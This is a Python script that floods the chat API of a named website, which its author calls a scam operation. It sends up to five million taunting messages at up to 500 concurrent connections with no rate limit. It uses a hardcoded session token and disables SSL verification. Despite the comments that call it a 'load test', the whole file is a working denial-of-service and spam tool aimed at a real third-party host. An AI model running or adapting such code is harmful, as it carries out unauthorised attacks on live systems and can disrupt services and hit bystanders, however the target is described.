# This script was written by 0xsec,
# Contact my email at 7a2d2771-9e9d-451a-8331-65a81dc074dc@slmail.me
# I think it is guaranteed the phishers will read this code,
# you should learn better ways of making money is the least I can say.

import asyncio
import aiohttp
import time
import sys
from collections import defaultdict, deque

# ================= CONFIG =================
HOST = "https://trumpsino.com" # muskplays.com was taken down around 11/17/25
ENDPOINT = "/api/mammoth/chat"
URL = HOST.rstrip("/") + ENDPOINT

TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoibG9naW4iLCJ1c2VySWQiOiI3MzkyOTkxNDczNzE4NzkxNzE4In0.-xKTfG8n5RSLnCUKOgGr6rWXYYwLtC4EUWz-WAagEDU" # REPLACE WITH A DIFFERENT TOKEN IF GETTING MANY ERRORS
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0",
    "Content-Type": "application/json",
    "Cookie": f"token={TOKEN}",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

MAX_REQUESTS = 5000000                # total requests to send
INITIAL_CONCURRENCY = 1
MAX_CONCURRENCY = 500
MIN_CONCURRENCY = 1
LATENCY_TARGET = 0.3                # target avg latency in seconds
ADJUST_INTERVAL = 0.5               # how often to adjust concurrency
TIMEOUT = 5.0
VERIFY_SSL = False

# max requests per second (prevents overshooting server but i like inf)
MAX_RPS = float('inf')

PAYLOAD_TEMPLATE = {"text": "!.FATAL ERR:WATCHDOG PREVENTED YOU FROM SCAMMING {i} PEOPLE. Can I talk to a human?"}
# ==========================================

# Global stats
total = 0
successes = 0
failures = 0
status_counts = defaultdict(int)
latencies = deque(maxlen=500)
_lock = asyncio.Lock()
stop_flag = False

class TokenBucket:
    def __init__(self, rate):
        self.rate = rate
        self.tokens = rate
        self.last = time.perf_counter()
        self.lock = asyncio.Lock()

    async def get_token(self):
        async with self.lock:
            now = time.perf_counter()
            delta = now - self.last
            self.tokens += delta * self.rate
            if self.tokens > self.rate:
                self.tokens = self.rate
            self.last = now
            if self.tokens >= 1:
                self.tokens -= 1
                return True
            return False

async def pre_ping(session):
    """Check if server is awake"""
    try:
        async with session.get(URL, headers=HEADERS, timeout=TIMEOUT) as resp:
            return resp.status == 200
    except:
        return False

async def send_request(session, sem, token_bucket, i):
    global total, successes, failures
    # respect RPS
    while True:
        if await token_bucket.get_token():
            break
        await asyncio.sleep(0.01)

    async with sem:
        start = time.perf_counter()
        try:
            # Apply {i} to payload dynamically
            payload = {k: v.format(i=i) for k, v in PAYLOAD_TEMPLATE.items()}

            async with session.post(URL, json=payload, headers=HEADERS, timeout=TIMEOUT) as resp:
                elapsed = time.perf_counter() - start
                async with _lock:
                    total += 1
                    status_counts[str(resp.status)] += 1
                    latencies.append(elapsed)
                    if 200 <= resp.status < 300:
                        successes += 1
                    else:
                        failures += 1
                return elapsed, resp.status
        except Exception:
            elapsed = time.perf_counter() - start
            async with _lock:
                total += 1
                failures += 1
                status_counts['error'] += 1
                latencies.append(elapsed)
            return elapsed, 'error'


async def worker(idx_iter, session, sem, token_bucket):
    for i in idx_iter:
        await send_request(session, sem, token_bucket, i)

async def adjust_semaphore(sem, concurrency_info):
    """Dynamically adjust concurrency"""
    while not stop_flag:
        await asyncio.sleep(ADJUST_INTERVAL)
        async with _lock:
            avg_latency = sum(latencies)/len(latencies) if latencies else 0
            error_rate = failures/total if total > 0 else 0
            current = concurrency_info['current']
            # increase
            if avg_latency < LATENCY_TARGET and error_rate < 0.05:
                new_c = min(current + 1, MAX_CONCURRENCY)
            # decrease
            elif avg_latency > LATENCY_TARGET*2 or error_rate > 0.2:
                new_c = max(current - 1, MIN_CONCURRENCY)
            else:
                new_c = current
            delta = new_c - current
            if delta > 0:
                for _ in range(delta):
                    sem.release()
            elif delta < 0:
                for _ in range(-delta):
                    await sem.acquire()
            concurrency_info['current'] = new_c

async def stats_printer(start_time, concurrency_info):
    while not stop_flag:
        await asyncio.sleep(1.0)
        async with _lock:
            elapsed = time.perf_counter() - start_time
            avg_latency = sum(latencies)/len(latencies) if latencies else 0
            rps = total / elapsed if elapsed > 0 else 0
            top_status = " ".join(f"{k}:{v}" for k,v in sorted(status_counts.items(), key=lambda x: -x[1])[:6])
            sys.stdout.write(
                "\r"
                f"sent: {total:>6}  ok: {successes:>6}  err: {failures:>6}  "
                f"r/s: {rps:6.1f}  avg-lat: {avg_latency*1000:6.1f}ms  "
                f"concurrency: {concurrency_info['current']}  [{top_status}]"
            )
            sys.stdout.flush()

async def run():
    global stop_flag
    start_time = time.perf_counter()
    concurrency_info = {'current': INITIAL_CONCURRENCY}
    sem = asyncio.Semaphore(INITIAL_CONCURRENCY)
    token_bucket = TokenBucket(MAX_RPS)

    timeout = aiohttp.ClientTimeout(total=None, sock_connect=TIMEOUT, sock_read=TIMEOUT)
    connector = aiohttp.TCPConnector(ssl=VERIFY_SSL)
    idx_gen = range(1, MAX_REQUESTS + 1)

    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        print("Waiting for server to be awake...")
        while not await pre_ping(session):
            await asyncio.sleep(1.0)
        print("Server awake, starting load...")

        stats_task = asyncio.create_task(stats_printer(start_time, concurrency_info))
        adjust_task = asyncio.create_task(adjust_semaphore(sem, concurrency_info))
        worker_task = asyncio.create_task(worker(idx_gen, session, sem, token_bucket))

        try:
            await worker_task
        finally:
            stop_flag = True
            stats_task.cancel()
            adjust_task.cancel()
            await asyncio.gather(stats_task, adjust_task, return_exceptions=True)

    # final summary after all requests have been sent
    print()
    elapsed_total = time.perf_counter() - start_time
    avg_latency = sum(latencies)/len(latencies) if latencies else 0
    rps = total/elapsed_total if elapsed_total>0 else 0
    print("=== SUMMARY ===")
    print(f"Total sent: {total}, Successes: {successes}, Failures: {failures}")
    print(f"Elapsed: {elapsed_total:.1f}s  Avg r/s: {rps:.2f}  Avg latency: {avg_latency*1000:.1f}ms")
    print("Top status codes:")
    for code,cnt in sorted(status_counts.items(), key=lambda kv: -kv[1])[:10]:
        print(f"  {code}: {cnt}")

if __name__ == "__main__":
    try:
        print("Starting fully dynamic async load test. Target:", URL)
        asyncio.run(run())
    except KeyboardInterrupt:
        print("\nInterrupted by user.")
